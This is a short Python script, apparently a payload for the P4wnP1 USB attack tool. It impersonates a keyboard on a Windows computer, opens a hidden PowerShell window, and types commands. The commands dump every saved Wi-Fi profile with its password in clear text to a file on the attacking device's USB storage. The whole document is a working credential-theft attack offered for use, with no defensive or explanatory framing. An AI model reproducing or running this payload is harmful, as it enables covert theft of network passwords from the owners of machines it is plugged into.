#!/usr/bin/env python3
import os, sys, time

P4WN_HOME = os.environ.get("P4WN_HOME", "/opt/p4wnp1")
sys.path.insert(0, os.path.join(P4WN_HOME, "tools"))
from hid_type import win_r, type_string

def main():
    msd_letter = os.getenv("P4WN_MSD_LETTER", "E:")
    output = f"{msd_letter}\\wifi_creds.txt"

    print(f"[*] Dumping Wi-Fi credentials to {output}")

    win_r()
    time.sleep(0.5)
    type_string("powershell\n")
    time.sleep(1.0)

    cmd = rf'''
$OutFile = "{output}";
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {{ ($_ -split ":")[1].Trim() }};
foreach ($p in $profiles) {{
    Add-Content -Path $OutFile -Value "`n==== $p ====";
    netsh wlan show profile name="$p" key=clear | Out-File -Append -FilePath $OutFile;
}}'''
    cmd = "powershell -nop -w hidden -c " + '"' + cmd.replace('\n', '').replace('"', '`"') + '"'

    type_string(cmd + "\n")
    print("[+] Wi-Fi credentials dumped.")

if __name__ == "__main__":
    main()
